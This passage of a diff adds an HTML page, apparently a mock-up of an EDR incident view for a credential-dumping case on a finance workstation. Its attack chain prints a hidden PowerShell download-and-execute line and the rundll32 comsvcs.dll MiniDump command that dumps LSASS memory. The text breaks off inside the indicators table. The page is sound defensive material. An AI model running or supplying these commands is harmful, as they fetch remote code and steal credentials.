@@ -1,0 +1,1237 @@
+<title>INC-2041 · Credential dumping on FIN-WS-0412</title>
+<style>
+  :root {
+    --bg: #0d131d;
+    --bg-2: #101823;
+    --surface: #16202e;
+    --surface-2: #1c2735;
+    --line: #253243;
+    --line-soft: #1d2837;
+    --text: #e6ecf4;
+    --dim: #93a2b7;
+    --faint: #6a7a8f;
+    --accent: #4a8fe7;
+    --accent-ink: #a9ccf7;
+    --accent-soft: rgba(74, 143, 231, 0.14);
+    --accent-hover-bg: #a9ccf7;
+    --accent-hover-fg: #0d131d;
+    --crit: #f0564f;
+    --high: #f08a3c;
+    --med: #dcae2e;
+    --low: #46a883;
+    --ok: #3fa87b;
+    --shadow: 0 1px 0 rgba(255, 255, 255, 0.03), 0 8px 24px -12px rgba(0, 0, 0, 0.6);
+
+    --sans: ui-sans-serif, system-ui, "Segoe UI", "Helvetica Neue", Arial, sans-serif;
+    --mono: ui-monospace, "SF Mono", "JetBrains Mono", Menlo, Consolas, monospace;
+    --gutter: clamp(16px, 3vw, 40px);
+  }
+
+  @media (prefers-color-scheme: light) {
+    :root {
+      --bg: #f5f7fa;
+      --bg-2: #eef1f6;
+      --surface: #ffffff;
+      --surface-2: #f2f5f9;
+      --line: #dde3ec;
+      --line-soft: #e7ebf2;
+      --text: #10192a;
+      --dim: #566275;
+      --faint: #7d8899;
+      --accent: #1d5fbf;
+      --accent-ink: #14498f;
+      --accent-soft: rgba(29, 95, 191, 0.09);
+    --accent-hover-bg: #14498f;
+    --accent-hover-fg: #ffffff;
+      --crit: #c8352e;
+      --high: #ad5f16;
+      --med: #8a6a12;
+      --low: #1f7054;
+      --ok: #1f7054;
+      --shadow: 0 1px 2px rgba(16, 25, 42, 0.05), 0 8px 20px -14px rgba(16, 25, 42, 0.25);
+    }
+  }
+
+  :root[data-theme="dark"] {
+    --bg: #0d131d;
+    --bg-2: #101823;
+    --surface: #16202e;
+    --surface-2: #1c2735;
+    --line: #253243;
+    --line-soft: #1d2837;
+    --text: #e6ecf4;
+    --dim: #93a2b7;
+    --faint: #6a7a8f;
+    --accent: #4a8fe7;
+    --accent-ink: #a9ccf7;
+    --accent-soft: rgba(74, 143, 231, 0.14);
+    --accent-hover-bg: #a9ccf7;
+    --accent-hover-fg: #0d131d;
+    --crit: #f0564f;
+    --high: #f08a3c;
+    --med: #dcae2e;
+    --low: #46a883;
+    --ok: #3fa87b;
+    --shadow: 0 1px 0 rgba(255, 255, 255, 0.03), 0 8px 24px -12px rgba(0, 0, 0, 0.6);
+  }
+
+  :root[data-theme="light"] {
+    --bg: #f5f7fa;
+    --bg-2: #eef1f6;
+    --surface: #ffffff;
+    --surface-2: #f2f5f9;
+    --line: #dde3ec;
+    --line-soft: #e7ebf2;
+    --text: #10192a;
+    --dim: #566275;
+    --faint: #7d8899;
+    --accent: #1d5fbf;
+    --accent-ink: #14498f;
+    --accent-soft: rgba(29, 95, 191, 0.09);
+    --accent-hover-bg: #14498f;
+    --accent-hover-fg: #ffffff;
+    --crit: #c8352e;
+    --high: #ad5f16;
+    --med: #8a6a12;
+    --low: #1f7054;
+    --ok: #1f7054;
+    --shadow: 0 1px 2px rgba(16, 25, 42, 0.05), 0 8px 20px -14px rgba(16, 25, 42, 0.25);
+  }
+
+  * { box-sizing: border-box; }
+
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    font-size: 14px;
+    line-height: 1.55;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  a { color: var(--accent); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  :focus-visible {
+    outline: 2px solid var(--accent);
+    outline-offset: 2px;
+    border-radius: 3px;
+  }
+
+  /* ---------- shared atoms ---------- */
+
+  .label {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 0.11em;
+    text-transform: uppercase;
+    color: var(--faint);
+  }
+
+  .mono { font-family: var(--mono); font-variant-numeric: tabular-nums; }
+
+  .pill {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 2px 9px 3px;
+    border: 1px solid var(--line);
+    border-radius: 999px;
+    background: var(--surface-2);
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: 0.04em;
+    color: var(--dim);
+    white-space: nowrap;
+  }
+
+  .pill .dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: currentColor;
+    flex: none;
+  }
+
+  .sev-crit { color: var(--crit); border-color: color-mix(in srgb, var(--crit) 38%, transparent); background: color-mix(in srgb, var(--crit) 11%, transparent); }
+  .sev-high { color: var(--high); border-color: color-mix(in srgb, var(--high) 38%, transparent); background: color-mix(in srgb, var(--high) 11%, transparent); }
+  .sev-med  { color: var(--med);  border-color: color-mix(in srgb, var(--med) 38%, transparent);  background: color-mix(in srgb, var(--med) 11%, transparent); }
+  .sev-low  { color: var(--low);  border-color: color-mix(in srgb, var(--low) 38%, transparent);  background: color-mix(in srgb, var(--low) 11%, transparent); }
+
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--line);
+    border-radius: 6px;
+    box-shadow: var(--shadow);
+  }
+
+  .card > header {
+    display: flex;
+    align-items: baseline;
+    justify-content: space-between;
+    gap: 12px;
+    padding: 13px 16px;
+    border-bottom: 1px solid var(--line-soft);
+  }
+
+  .card > header h2 {
+    margin: 0;
+    font-size: 13px;
+    font-weight: 620;
+    letter-spacing: -0.005em;
+  }
+
+  .card-body { padding: 16px; }
+
+  button {
+    font: inherit;
+    color: inherit;
+    cursor: pointer;
+  }
+
+  .btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 7px;
+    padding: 6px 12px;
+    border: 1px solid var(--line);
+    border-radius: 5px;
+    background: var(--surface-2);
+    font-size: 12.5px;
+    font-weight: 520;
+    transition: border-color 0.14s, background 0.14s, transform 0.06s;
+  }
+  .btn:hover { border-color: var(--accent); background: var(--accent-soft); }
+  .btn:active { transform: translateY(1px); }
+  .btn-primary {
+    background: var(--accent);
+    border-color: var(--accent);
+    color: #fff;
+  }
+  .btn-primary:hover {
+    background: var(--accent-hover-bg);
+    border-color: var(--accent-hover-bg);
+    color: var(--accent-hover-fg);
+  }
+  .btn-danger { color: var(--crit); }
+  .btn-danger:hover { border-color: var(--crit); background: color-mix(in srgb, var(--crit) 12%, transparent); }
+
+  /* ---------- top bar ---------- */
+
+  .topbar {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 0 var(--gutter);
+    height: 46px;
+    border-bottom: 1px solid var(--line);
+    background: var(--bg-2);
+    position: sticky;
+    top: 0;
+    z-index: 20;
+  }
+
+  .brand {
+    display: flex;
+    align-items: center;
+    gap: 9px;
+    font-weight: 640;
+    font-size: 13px;
+    letter-spacing: -0.01em;
+  }
+
+  .brand-mark {
+    width: 18px;
+    height: 18px;
+    border: 1.5px solid var(--accent);
+    border-radius: 4px;
+    position: relative;
+    flex: none;
+  }
+  .brand-mark::after {
+    content: "";
+    position: absolute;
+    inset: 4px;
+    background: var(--accent);
+    border-radius: 1px;
+  }
+
+  .crumbs {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 12.5px;
+    color: var(--dim);
+    overflow: hidden;
+  }
+  .crumbs span { color: var(--faint); }
+  .crumbs strong { color: var(--text); font-weight: 560; }
+
+  .topbar-right {
+    margin-left: auto;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .live {
+    display: inline-flex;
+    align-items: center;
+    gap: 7px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--dim);
+  }
+  .live i {
+    width: 7px;
+    height: 7px;
+    border-radius: 50%;
+    background: var(--ok);
+    box-shadow: 0 0 0 3px color-mix(in srgb, var(--ok) 22%, transparent);
+    animation: pulse 2.4s ease-in-out infinite;
+  }
+  @keyframes pulse { 50% { box-shadow: 0 0 0 6px color-mix(in srgb, var(--ok) 0%, transparent); } }
+  @media (prefers-reduced-motion: reduce) {
+    .live i { animation: none; }
+    * { scroll-behavior: auto !important; }
+  }
+
+  .avatar {
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    background: var(--accent-soft);
+    border: 1px solid var(--line);
+    color: var(--accent-ink);
+    display: grid;
+    place-items: center;
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 0.03em;
+  }
+
+  /* ---------- incident header ---------- */
+
+  .shell {
+    max-width: 1440px;
+    margin: 0 auto;
+    padding: 0 var(--gutter) 64px;
+  }
+
+  .inc-head {
+    display: flex;
+    gap: 18px;
+    padding: 26px 0 20px;
+  }
+
+  .sev-rail {
+    width: 4px;
+    border-radius: 4px;
+    background: linear-gradient(180deg, var(--crit), color-mix(in srgb, var(--crit) 25%, transparent));
+    flex: none;
+  }
+
+  .inc-head-main { min-width: 0; flex: 1; }
+
+  .inc-id {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    flex-wrap: wrap;
+    margin-bottom: 9px;
+  }
+  .inc-id .code {
+    font-family: var(--mono);
+    font-size: 11.5px;
+    letter-spacing: 0.06em;
+    color: var(--dim);
+  }
+
+  h1 {
+    margin: 0 0 12px;
+    font-size: clamp(21px, 2.5vw, 29px);
+    line-height: 1.2;
+    font-weight: 650;
+    letter-spacing: -0.024em;
+    text-wrap: balance;
+    max-width: 22ch;
+  }
+  h1 em {
+    font-style: normal;
+    font-family: var(--mono);
+    font-size: 0.82em;
+    letter-spacing: -0.01em;
+    color: var(--accent-ink);
+    padding: 0 1px;
+  }
+
+  .inc-sub {
+    max-width: 66ch;
+    color: var(--dim);
+    font-size: 13.5px;
+    margin: 0;
+  }
+
+  .inc-head-actions {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-end;
+    gap: 10px;
+    flex: none;
+  }
+  .inc-head-actions .row { display: flex; gap: 8px; }
+
+  /* ---------- facts strip ---------- */
+
+  .facts {
+    display: grid;
+    grid-template-columns: repeat(4, minmax(0, 1fr));
+    border: 1px solid var(--line);
+    border-radius: 6px;
+    background: var(--surface);
+    overflow: hidden;
+  }
+
+  .fact {
+    padding: 11px 14px 12px;
+    border-right: 1px solid var(--line-soft);
+    border-bottom: 1px solid var(--line-soft);
+    min-width: 0;
+  }
+  .fact:nth-child(4n) { border-right: 0; }
+  .fact:nth-last-child(-n + 4) { border-bottom: 0; }
+
+  @media (max-width: 720px) {
+    .facts { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+    .fact:nth-child(4n) { border-right: 1px solid var(--line-soft); }
+    .fact:nth-child(2n) { border-right: 0; }
+  }
+  .fact dt { margin: 0 0 4px; }
+  .fact dd {
+    margin: 0;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    font-variant-numeric: tabular-nums;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+  }
+  .fact dd small { color: var(--faint); font-size: 11px; }
+
+  /* ---------- main split ---------- */
+
+  .split {
+    display: grid;
+    grid-template-columns: minmax(0, 1fr) 328px;
+    gap: 20px;
+    margin-top: 20px;
+    align-items: start;
+  }
+
+  .col { display: flex; flex-direction: column; gap: 20px; min-width: 0; }
+
+  .rail { position: sticky; top: 66px; }
+
+  @media (max-width: 1080px) {
+    .split { grid-template-columns: minmax(0, 1fr); }
+    .rail { position: static; }
+    .inc-head { flex-wrap: wrap; }
+    .inc-head-actions { align-items: flex-start; width: 100%; }
+  }
+
+  /* ---------- verdict ---------- */
+
+  .verdict {
+    display: grid;
+    grid-template-columns: 96px minmax(0, 1fr);
+    gap: 18px;
+    align-items: start;
+  }
+
+  .score {
+    text-align: center;
+    padding: 10px 0 12px;
+    border: 1px solid color-mix(in srgb, var(--crit) 32%, transparent);
+    border-radius: 6px;
+    background: color-mix(in srgb, var(--crit) 9%, transparent);
+  }
+  .score b {
+    display: block;
+    font-family: var(--mono);
+    font-size: 30px;
+    line-height: 1;
+    font-weight: 600;
+    color: var(--crit);
+    font-variant-numeric: tabular-nums;
+  }
+  .score span { display: block; margin-top: 5px; }
+
+  .verdict p { margin: 0 0 12px; max-width: 68ch; }
+  .verdict p:last-child { margin-bottom: 0; }
+  .verdict code {
+    font-family: var(--mono);
+    font-size: 12px;
+    background: var(--surface-2);
+    border: 1px solid var(--line-soft);
+    border-radius: 3px;
+    padding: 1px 5px;
+  }
+
+  .kill-bar {
+    display: flex;
+    gap: 3px;
+    margin-bottom: 14px;
+  }
+  .kill-bar div {
+    flex: 1;
+    height: 5px;
+    border-radius: 2px;
+    background: var(--surface-2);
+  }
+  .kill-bar div.on { background: var(--crit); }
+  .kill-bar div.on.dim { background: color-mix(in srgb, var(--crit) 45%, transparent); }
+
+  /* ---------- attack chain ---------- */
+
+  .chain { list-style: none; margin: 0; padding: 0; }
+
+  .chain > li {
+    display: grid;
+    grid-template-columns: 74px 26px minmax(0, 1fr);
+    gap: 0 12px;
+    position: relative;
+    padding-bottom: 20px;
+  }
+  .chain > li:last-child { padding-bottom: 0; }
+
+  .chain time {
+    font-family: var(--mono);
+    font-size: 11.5px;
+    color: var(--faint);
+    text-align: right;
+    padding-top: 2px;
+    font-variant-numeric: tabular-nums;
+  }
+
+  .chain .node {
+    position: relative;
+    display: flex;
+    justify-content: center;
+  }
+  .chain .node b {
+    width: 22px;
+    height: 22px;
+    border-radius: 50%;
+    border: 1px solid var(--line);
+    background: var(--surface-2);
+    display: grid;
+    place-items: center;
+    font-family: var(--mono);
+    font-size: 10.5px;
+    color: var(--dim);
+    z-index: 1;
+    flex: none;
+  }
+  .chain > li:not(:last-child) .node::after {
+    content: "";
+    position: absolute;
+    top: 24px;
+    bottom: -20px;
+    width: 1px;
+    background: var(--line);
+  }
+  .chain > li.hot .node b {
+    border-color: var(--crit);
+    color: var(--crit);
+    background: color-mix(in srgb, var(--crit) 13%, transparent);
+  }
+
+  .chain-body { padding-top: 1px; min-width: 0; }
+  .chain-body h3 {
+    margin: 0 0 4px;
+    font-size: 13px;
+    font-weight: 600;
+    letter-spacing: -0.005em;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    flex-wrap: wrap;
+  }
+  .chain-body p { margin: 0 0 7px; color: var(--dim); max-width: 68ch; font-size: 13px; }
+  .chain-body p:last-child { margin-bottom: 0; }
+
+  .cmd {
+    margin: 0;
+    padding: 9px 11px;
+    background: var(--bg-2);
+    border: 1px solid var(--line-soft);
+    border-left: 2px solid var(--accent);
+    border-radius: 0 4px 4px 0;
+    font-family: var(--mono);
+    font-size: 11.5px;
+    line-height: 1.6;
+    color: var(--dim);
+    overflow-x: auto;
+    white-space: pre;
+  }
+  .cmd b { color: var(--text); font-weight: 500; }
+
+  .tech {
+    font-family: var(--mono);
+    font-size: 10.5px;
+    letter-spacing: 0.04em;
+    color: var(--accent-ink);
+    background: var(--accent-soft);
+    border: 1px solid color-mix(in srgb, var(--accent) 26%, transparent);
+    border-radius: 3px;
+    padding: 1px 5px;
+    white-space: nowrap;
+  }
+
+  /* ---------- process tree ---------- */
+
+  .tree { font-family: var(--mono); font-size: 12px; overflow-x: auto; }
+  .tree ul { list-style: none; margin: 0; padding-left: 22px; position: relative; }
+  .tree > ul { padding-left: 0; }
+  .tree li { position: relative; padding: 3px 0; white-space: nowrap; }
+  .tree ul ul::before {
+    content: "";
+    position: absolute;
+    left: 5px;
+    top: -2px;
+    bottom: 14px;
+    width: 1px;
+    background: var(--line);
+  }
+  .tree ul ul > li::before {
+    content: "";
+    position: absolute;
+    left: -17px;
+    top: 14px;
+    width: 12px;
+    height: 1px;
+    background: var(--line);
+  }
+  .tree .pid { color: var(--faint); }
+  .tree .flag {
+    margin-left: 8px;
+    font-size: 10px;
+    letter-spacing: 0.05em;
+    text-transform: uppercase;
+    padding: 0 5px;
+    border-radius: 3px;
+  }
+  .tree .flag.killed { color: var(--crit); border: 1px solid color-mix(in srgb, var(--crit) 34%, transparent); }
+  .tree .flag.watch { color: var(--med); border: 1px solid color-mix(in srgb, var(--med) 34%, transparent); }
+  .tree .bad { color: var(--crit); }
+
+  /* ---------- tabs + tables ---------- */
+
+  .tabs {
+    display: flex;
+    gap: 2px;
+    padding: 0 16px;
+    border-bottom: 1px solid var(--line-soft);
+  }
+  .tab {
+    background: none;
+    border: 0;
+    border-bottom: 2px solid transparent;
+    padding: 12px 10px 10px;
+    font-size: 12.5px;
+    font-weight: 540;
+    color: var(--dim);
+    display: flex;
+    align-items: center;
+    gap: 7px;
+  }
+  .tab:hover { color: var(--text); }
+  .tab[aria-selected="true"] { color: var(--text); border-bottom-color: var(--accent); }
+  .tab .n {
+    font-family: var(--mono);
+    font-size: 10.5px;
+    background: var(--surface-2);
+    border: 1px solid var(--line-soft);
+    border-radius: 999px;
+    padding: 0 6px;
+    color: var(--faint);
+  }
+
+  .panel[hidden] { display: none; }
+
+  .table-wrap { overflow-x: auto; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12.5px;
+  }
+  thead th {
+    text-align: left;
+    padding: 9px 16px;
+    background: var(--surface-2);
+    border-bottom: 1px solid var(--line-soft);
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: var(--faint);
+    font-weight: 400;
+    white-space: nowrap;
+  }
+  tbody td {
+    padding: 10px 16px;
+    border-bottom: 1px solid var(--line-soft);
+    vertical-align: top;
+    white-space: nowrap;
+  }
+  tbody tr:last-child td { border-bottom: 0; }
+  tbody tr:hover td { background: var(--surface-2); }
+  td.t { font-family: var(--mono); font-variant-numeric: tabular-nums; }
+  td.trunc { max-width: 260px; overflow: hidden; text-overflow: ellipsis; }
+  .sub { display: block; color: var(--faint); font-size: 11.5px; white-space: nowrap; }
+
+  /* ---------- rail cards ---------- */
+
+  .actions { display: flex; flex-direction: column; gap: 0; }
+
+  .action {
+    display: grid;
+    grid-template-columns: 18px minmax(0, 1fr) auto;
+    gap: 10px;
+    align-items: center;
+    padding: 11px 16px;
+    border-bottom: 1px solid var(--line-soft);
+    font-size: 12.5px;
+  }
+  .action:last-child { border-bottom: 0; }
+  .action .mark {
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    border: 1px solid var(--line);
+    display: grid;
+    place-items: center;
+    font-size: 9px;
+    color: var(--faint);
+    flex: none;
+  }
+  .action.done .mark { border-color: var(--ok); color: var(--ok); background: color-mix(in srgb, var(--ok) 13%, transparent); }
+  .action.done .name { color: var(--dim); }
+  .action .name { min-width: 0; }
+  .action .name span { display: block; }
+  .action .when { font-family: var(--mono); font-size: 10.5px; color: var(--faint); }
+  .action .go {
+    border: 1px solid var(--line);
+    background: var(--surface-2);
+    border-radius: 4px;
+    padding: 3px 9px;
+    font-size: 11.5px;
+    font-weight: 540;
+    white-space: nowrap;
+  }
+  .action .go:hover { border-color: var(--accent); color: var(--accent-ink); background: var(--accent-soft); }
+  .action .go[disabled] { opacity: 0.45; cursor: default; }
+  .action .go[disabled]:hover { border-color: var(--line); color: inherit; background: var(--surface-2); }
+
+  .meta-list { display: flex; flex-direction: column; gap: 11px; }
+  .meta-row { display: grid; grid-template-columns: 92px minmax(0, 1fr); gap: 10px; align-items: baseline; }
+  .meta-row > div:last-child { font-size: 12.5px; min-width: 0; }
+
+  .mitre { display: flex; flex-direction: column; gap: 9px; }
+  .mitre-item {
+    display: grid;
+    grid-template-columns: minmax(0, 1fr) auto;
+    gap: 10px;
+    align-items: baseline;
+    padding-bottom: 9px;
+    border-bottom: 1px dashed var(--line-soft);
+  }
+  .mitre-item:last-child { border-bottom: 0; padding-bottom: 0; }
+  .mitre-item .nm { font-size: 12.5px; }
+  .mitre-item .ph { display: block; }
+
+  .coverage { display: flex; flex-direction: column; gap: 9px; }
+  .cov-row { display: grid; grid-template-columns: 92px minmax(0, 1fr) 30px; gap: 9px; align-items: center; }
+  .cov-row .label { white-space: nowrap; }
+  .cov-bar { height: 5px; border-radius: 3px; background: var(--surface-2); overflow: hidden; }
+  .cov-bar i { display: block; height: 100%; background: var(--accent); border-radius: 3px; }
+  .cov-row .v { font-family: var(--mono); font-size: 11.5px; color: var(--dim); text-align: right; font-variant-numeric: tabular-nums; }
+
+  /* ---------- toast ---------- */
+
+  .toast-stack {
+    position: fixed;
+    bottom: 18px;
+    right: 18px;
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    z-index: 50;
+  }
+  .toast {
+    display: flex;
+    align-items: center;
+    gap: 9px;
+    padding: 10px 14px;
+    background: var(--surface);
+    border: 1px solid var(--line);
+    border-left: 3px solid var(--ok);
+    border-radius: 5px;
+    box-shadow: var(--shadow);
+    font-size: 12.5px;
+    max-width: 320px;
+  }
+
+  footer.page-foot {
+    margin-top: 26px;
+    padding-top: 14px;
+    border-top: 1px solid var(--line-soft);
+    display: flex;
+    gap: 14px;
+    flex-wrap: wrap;
+    justify-content: space-between;
+    color: var(--faint);
+    font-size: 11.5px;
+    font-family: var(--mono);
+  }
+</style>
+
+<header class="topbar">
+  <div class="brand"><span class="brand-mark"></span>Sentinel EDR</div>
+  <nav class="crumbs" aria-label="Breadcrumb">
+    <span>Detections</span><span aria-hidden="true">/</span>
+    <a href="incidents-home.html">Incidents</a><span aria-hidden="true">/</span>
+    <strong class="mono">INC-2041</strong>
+  </nav>
+  <div class="topbar-right">
+    <span class="live"><i aria-hidden="true"></i>Telemetry live</span>
+    <span class="avatar" title="Assigned to you">KB</span>
+  </div>
+</header>
+
+<div class="shell">
+
+  <div class="inc-head">
+    <div class="sev-rail" aria-hidden="true"></div>
+    <div class="inc-head-main">
+      <div class="inc-id">
+        <span class="pill sev-crit"><span class="dot" aria-hidden="true"></span>Critical</span>
+        <span class="pill">Contained · not eradicated</span>
+        <span class="code">INC-2041 · opened 09:14:22 IST</span>
+      </div>
+      <h1>Credential dumping from LSASS memory on <em>FIN-WS-0412</em></h1>
+      <p class="inc-sub">A signed but unusual PowerShell chain read the memory of the Local Security Authority process and wrote it to disk, then attempted an outbound TLS session to an unclassified host. The endpoint is isolated. Credentials for the signed-in user should be treated as compromised.</p>
+    </div>
+    <div class="inc-head-actions">
+      <div class="row">
+        <button class="btn" data-toast="Investigation notes saved to INC-2041.">Add note</button>
+        <button class="btn" data-toast="Escalated to Tier 3 — S. Iyer paged.">Escalate</button>
+      </div>
+      <div class="row">
+        <button class="btn btn-danger" data-toast="Endpoint FIN-WS-0412 kept in isolation.">Keep isolated</button>
+        <button class="btn btn-primary" data-toast="Resolve blocked — 2 response actions still pending.">Resolve incident</button>
+      </div>
+      <span class="label">Last telemetry 34 s ago</span>
+    </div>
+  </div>
+
+  <dl class="facts">
+    <div class="fact"><dt class="label">Endpoint</dt><dd>FIN-WS-0412 <small>· 10.42.18.116</small></dd></div>
+    <div class="fact"><dt class="label">Operating system</dt><dd>Windows 11 Pro 23H2</dd></div>
+    <div class="fact"><dt class="label">Signed-in user</dt><dd>CORP\r.venkat</dd></div>
+    <div class="fact"><dt class="label">Business unit</dt><dd>Finance — Chennai</dd></div>
+    <div class="fact"><dt class="label">First seen</dt><dd>27 Jul 09:14:22</dd></div>
+    <div class="fact"><dt class="label">Detection engine</dt><dd>Behaviour analytics</dd></div>
+    <div class="fact"><dt class="label">Dwell time</dt><dd>6 m 51 s</dd></div>
+    <div class="fact"><dt class="label">Analyst</dt><dd>K. Bala <small>· Tier 2</small></dd></div>
+  </dl>
+
+  <div class="split">
+
+    <!-- ============ evidence column ============ -->
+    <div class="col">
+
+      <section class="card">
+        <header>
+          <h2>Verdict</h2>
+          <span class="label">Confidence 96% · 4 correlated detections</span>
+        </header>
+        <div class="card-body verdict">
+          <div class="score">
+            <b>92</b>
+            <span class="label">risk / 100</span>
+          </div>
+          <div>
+            <div class="kill-bar" role="img" aria-label="Kill chain progress: five of seven stages observed">
+              <div class="on"></div><div class="on"></div><div class="on"></div>
+              <div class="on"></div><div class="on dim"></div><div></div><div></div>
+            </div>
+            <p>This is a genuine credential-theft attempt, not a false positive. A macro-enabled invoice attachment spawned an encoded PowerShell command, which loaded <code>comsvcs.dll</code> and called <code>MiniDump</code> against PID 748 — the canonical living-off-the-land route to LSASS that avoids dropping Mimikatz on disk.</p>
+            <p>Exfiltration did not complete: the outbound session to <code>185.34.212.9:8443</code> was blocked by the network filter after 2 KB, and the endpoint was isolated 41 seconds later. The dump file <code>C:\Windows\Temp\dbg_748.tmp</code> was quarantined intact and is available for analysis.</p>
+            <p>Two other Finance endpoints received the same attachment from <code>accounts@vendor-billing-desk.net</code> at 09:02. Neither executed it, but both remain at risk until the sender is blocked at the mail gateway.</p>
+          </div>
+        </div>
+      </section>
+
+      <section class="card">
+        <header>
+          <h2>Attack chain</h2>
+          <span class="label">6 stages · 09:11:07 → 09:15:03</span>
+        </header>
+        <div class="card-body">
+          <ol class="chain">
+            <li>
+              <time datetime="2026-07-27T09:11:07+05:30">09:11:07</time>
+              <div class="node"><b>1</b></div>
+              <div class="chain-body">
+                <h3>Malicious attachment opened <span class="tech">T1566.001</span></h3>
+                <p>User opened <span class="mono">Invoice_JUL_4471.xlsm</span> from Outlook. Macro security was satisfied by a stolen certificate that expired in 2024.</p>
+              </div>
+            </li>
+            <li>
+              <time datetime="2026-07-27T09:11:44+05:30">09:11:44</time>
+              <div class="node"><b>2</b></div>
+              <div class="chain-body">
+                <h3>Encoded PowerShell spawned by Excel <span class="tech">T1059.001</span></h3>
+                <p>An Office process creating a hidden shell is anomalous for this endpoint — zero prior occurrences in 90 days.</p>
+                <pre class="cmd">powershell.exe -nop -w hidden -enc <b>SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA…</b>
+  ↳ decodes to: IEX (New-Object Net.WebClient).DownloadString('hxxps://updates-cdn-sync[.]net/a')</pre>
+              </div>
+            </li>
+            <li>
+              <time datetime="2026-07-27T09:12:20+05:30">09:12:20</time>
+              <div class="node"><b>3</b></div>
+              <div class="chain-body">
+                <h3>Run key written for persistence <span class="tech">T1547.001</span></h3>
+                <p>Value <span class="mono">OneDriveSyncHost</span> added under <span class="mono">HKCU\…\CurrentVersion\Run</span>, pointing at a copy of the loader in the user's AppData. Registry change is reversible from the response rail.</p>
+              </div>
+            </li>
+            <li class="hot">
+              <time datetime="2026-07-27T09:14:22+05:30">09:14:22</time>
+              <div class="node"><b>4</b></div>
+              <div class="chain-body">
+                <h3>LSASS memory dumped <span class="tech">T1003.001</span> <span class="pill sev-crit"><span class="dot" aria-hidden="true"></span>Detection fired</span></h3>
+                <p>Handle opened against <span class="mono">lsass.exe</span> (PID 748) with <span class="mono">PROCESS_VM_READ</span>, then a 42 MB dump written to disk.</p>
+                <pre class="cmd">rundll32.exe C:\Windows\System32\comsvcs.dll, <b>MiniDump 748 C:\Windows\Temp\dbg_748.tmp full</b></pre>
+              </div>
+            </li>
+            <li class="hot">
+              <time datetime="2026-07-27T09:14:51+05:30">09:14:51</time>
+              <div class="node"><b>5</b></div>
+              <div class="chain-body">
+                <h3>Outbound exfiltration attempt blocked <span class="tech">T1041</span></h3>
+                <p>TLS session to <span class="mono">185.34.212.9:8443</span> (AS204601, Seychelles) torn down after 2 KB. Certificate was self-signed with a 3-hour validity window.</p>
+              </div>
+            </li>
+            <li>
+              <time datetime="2026-07-27T09:15:03+05:30">09:15:03</time>
+              <div class="node"><b>6</b></div>
+              <div class="chain-body">
+                <h3>Endpoint isolated automatically</h3>
+                <p>Containment policy <span class="mono">FIN-CRIT-AUTO</span> cut all traffic except the management channel, and killed the process tree below.</p>
+              </div>
+            </li>
+          </ol>
+        </div>
+      </section>
+
+      <section class="card">
+        <header>
+          <h2>Process tree</h2>
+          <span class="label">3 processes terminated</span>
+        </header>
+        <div class="card-body tree">
+          <ul>
+            <li>
+              <span>explorer.exe</span> <span class="pid">· 4188 · CORP\r.venkat</span>
+              <ul>
+                <li>
+                  <span>EXCEL.EXE</span> <span class="pid">· 7312</span> <span class="flag watch">suspicious child</span>
+                  <ul>
+                    <li>
+                      <span class="bad">powershell.exe</span> <span class="pid">· 9044</span> <span class="flag killed">killed</span>
+                      <ul>
+                        <li><span class="bad">rundll32.exe</span> <span class="pid">· 9310</span> <span class="flag killed">killed</span></li>
+                        <li><span class="bad">cmd.exe</span> <span class="pid">· 9376</span> <span class="flag killed">killed</span></li>
+                      </ul>
+                    </li>
+                  </ul>
+                </li>
+                <li><span>OUTLOOK.EXE</span> <span class="pid">· 6120</span></li>
+              </ul>
+            </li>
+            <li><span>lsass.exe</span> <span class="pid">· 748 · NT AUTHORITY\SYSTEM</span> <span class="flag watch">target of dump</span></li>
+          </ul>
+        </div>
+      </section>
+
+      <section class="card">
+        <div class="tabs" role="tablist" aria-label="Incident evidence">
+          <button class="tab" role="tab" id="tab-ioc" aria-controls="p-ioc" aria-selected="true">Indicators <span class="n">7</span></button>
+          <button class="tab" role="tab" id="tab-assets" aria-controls="p-assets" aria-selected="false">Affected assets <span class="n">3</span></button>
+          <button class="tab" role="tab" id="tab-log" aria-controls="p-log" aria-selected="false">Analyst activity <span class="n">5</span></button>
+        </div>
+
+        <div class="panel table-wrap" id="p-ioc" role="tabpanel" aria-labelledby="tab-ioc">
+          <table>
+            <thead>
+              <tr><th scope="col">Type</th><th scope="col">Indicator</th><th scope="col">First seen</th><th scope="col">Reputation</th><th scope="col">Status</th></tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>SHA-256</td>
+                <td class="t trunc" title="9f2c4ab1e77d05c3e8b6a41f0d92bc7e5518aa30f6c1d4b982e77a5c30b1d4ef">9f2c4ab1e77d05c3…30b1d4ef<span class="sub">Invoice_JUL_4471.xlsm</span></td>
+                <td class="t">09:11:07</td>
+                <td><span class="pill sev-crit"><span class="dot" aria-hidden="true"></span>Malicious</span><span class="sub">51 / 68 vendors</span></td>
+                <td>Blocked org-wide</td>
+              </tr>
+              <tr>
+                <td>SHA-256</td>
